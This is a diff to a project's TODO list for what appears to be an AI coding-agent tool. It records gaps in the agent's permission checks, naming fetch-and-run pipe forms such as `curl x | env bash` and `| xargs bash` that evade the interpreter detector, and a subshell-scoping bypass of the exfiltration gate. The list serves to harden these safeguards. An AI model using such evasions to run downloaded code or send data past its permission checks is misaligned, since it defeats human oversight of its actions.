@@ -1,5 +1,41 @@
 # TODO
 
+## Review-fix follow-ups: three deferred items (2026-09-29)
+
+From the broad review of the `dd431b4a` batch. These three were deferred because
+their files were under concurrent edit when the other five fixes landed.
+
+- **`pipesIntoInterpreter` wrapper/prefix evasions** (`internal/agent/permissions.go`).
+  The tokenized checker catches `| bash` / `| sh` / `| python…` (quoted pipes are
+  correctly ignored), but misses wrapper and prefix forms of the same RCE shape:
+  `curl x | env bash`, `| xargs bash`, `| nohup bash`, `| FOO=1 python3`,
+  `| (bash)`. Coverage was lost when the old `"| bash"`-style substring patterns
+  moved into the helper. Fix by peeling known wrappers (`env`, `xargs`, `nohup`,
+  `nice`, `stdbuf`, `time`, `command`) and env-assignment prefixes when resolving
+  the pipe target, or keep a conservative substring fallback. One test per form.
+- **`SpeechProvider` unmount invalidation** (`web/src/components/Speech/SpeechProvider.tsx`).
+  Unmount bumps `generation` but not the pending-request generation, so a `speak()`
+  awaiting the summary LLM call can still start synthesis after the provider is
+  gone. The file was refactored concurrently (+~390 lines) — re-check against the
+  new `queueRun` / `settleCurrent` / `localRequestGeneration` shape before fixing.
+- **Redaction on the permission-interpreter client** (`internal/agent/permission_interpreter.go:239`).
+  It builds a side client via `bindOpenCodeSessionID` only, and sends the command
+  plus interpreter source to the auto-permission model. Decide whether it should
+  be `bindSideClient` (privacy) or intentionally unmasked (the judge must see raw
+  text to judge exfiltration), mirroring the registry-gated decision in
+  `agent.go`'s askPermissionModel. Add an `// intentional:` comment either way.
+
+Fixed in the same pass (see CHANGES.md): redaction on side clients, host-on-tab,
+the Pulse refetch storm + time sort, port-map DELETE ordering + ID namespacing,
+and `h.mu` scoped out of the compact-config save.
+
+## Exfiltration gate: literal-assignment resolution deferred (2026-09-29)
+
+- **Literal-assignment resolution (deferred).** `B='http://127.0.0.1:…'; curl "$B"` still Asks.
+  Resolving single top-level literal bindings before the exfil check would fix that pattern, but not
+  URLs passed as function args (`probe() { curl "$2"; }`), and adds bypass surface
+  (`(K=x); curl …$K` subshell scoping) — needs its own design.
+
 ## Desktop HTTPS/HTTP2: unverified on Windows and Linux (2026-09-28)
 
 Verified live on macOS only. Windows (WebView2 `--ignore-certificate-errors-spki-list`)
@@ -1038,6 +1074,23 @@ skill). Not yet done:
   (the question text states the trap), rewrite them to show raw tool output and
   ask only for a status; (4) `skills/kaizen-review` still maps
   hallucinated-path/API/flag findings to conduct tags, not the new corpus.
+
+- [ ] **`docx` / `pptx` have the same create-from-scratch hole `pdf` just lost
+  (2026-09-29).** The `pdf` corpus is now model-gated only
+  (`universalStacks` in `internal/skill/loader.go`), because a `*.pdf` marker
+  cannot detect a PDF that does not exist yet, one attached from outside the
+  repo, or one deeper than the glob limit — so a "create a PDF" task ran with no
+  catalogue line and no digest, and the corrections were unreachable. `docx`
+  and `pptx` are gated on exactly the same marker proxies
+  (`internal/stackdetect`: `*.docx`/`*.doc`, `*.pptx`/`*.ppt`) and have derived
+  skills for `space-bunny-free`, so they reproduce the identical defect: ask for
+  a new document and the model gets no `docx`/`pptx` corrections. Not changed
+  here because the call was scoped to `pdf`. To fix: add the corpus to
+  `universalStacks`, flip `detection.mode` in `docs/okf/{docx,pptx}/meta.yaml`,
+  rewrite the `when_to_use` prose in each `docs/okf/{docx,pptx}/derived/*.SKILL.md`
+  (it currently says "AND the repository contains a ..."), re-run
+  `docs/okf/_tools/sync-derived-skills.py`, and re-point the cross-stack
+  `notWant` lists in `internal/skill/kaizen_office_test.go`.
 
 - [x] **Detection engine** — `internal/stackdetect` (`Detect(root) []string`)
   reads package.json deps + marker files per `stack-detection.md`. Tested. This
@@ -2720,3 +2773,25 @@ scope:
   walk the tree (with a cap) or make pdf universal like conduct.
 - [ ] **mimo-v2.6-flash has no pdf skill** (no tag < 0.75; live probe 8/8). row-delete sits exactly at 0.75 and
   the model states wrong `apply_redactions` defaults. Re-baseline once before deciding whether to derive one.
+
+## Chat scroll bounce — residual gaps (2026-09-29)
+
+- [ ] **The virtual-core fold arithmetic is not covered by CI.** In
+  `ChatPanel.tsx`, `virtualizer.shouldAdjustScrollPositionOnItemSizeChange` reproduces virtual-core's own
+  two-branch default (first measure -> `item.start < offset`; re-measure -> `item.start + item.size <= offset
+  && scrollDirection !== "backward"`), ANDed with `!atBottomRef.current`. A *compiling* mutant that drops the
+  fold check survives the entire web suite, because jsdom has no layout engine: every row measures 96px via a
+  stubbed `offsetHeight` and there is no real scroll geometry, so the compensation path is never exercised.
+  Everything else in the fix IS guarded (key stability via `web/src/lib/chatItemKeys.test.ts` and the
+  disclosure tests; the intent-gated unpin via mutation-verified tests). This one needs a real browser.
+- [ ] **Add a browser-only regression for the turn-end swap.** The decisive check is: pin a tall transcript,
+  replay a `messages` SSE event (which dispatches `SET_MESSAGES` and clears `live`), and assert the gap
+  `scrollHeight - scrollTop - clientHeight` never exceeds 2px and `scrollTop` never decreases. The
+  reproducible harness is: `go build -o /tmp/ocode-test .` + `serve` on a non-4096 port, Playwright with
+  `http_credentials`, and `page.route` to replay recorded frames so no LLM call is needed. Two traps already
+  paid for: a page holds several keep-alive ChatPanels so `querySelector` returns a `display:none` one (select
+  on `clientHeight > 0 && offsetParent !== null`), and a server started with an empty store renders no chat
+  panel at all until a project is registered (`POST /api/projects`).
+- [ ] **Prove the control.** Any future browser assertion for the above should also run against a pre-fix
+  build (`git show HEAD:web/src/components/Chat/ChatPanel.tsx`, built separately, no stash) and FAIL there.
+  An assertion that passes on both builds is not measuring the fix.
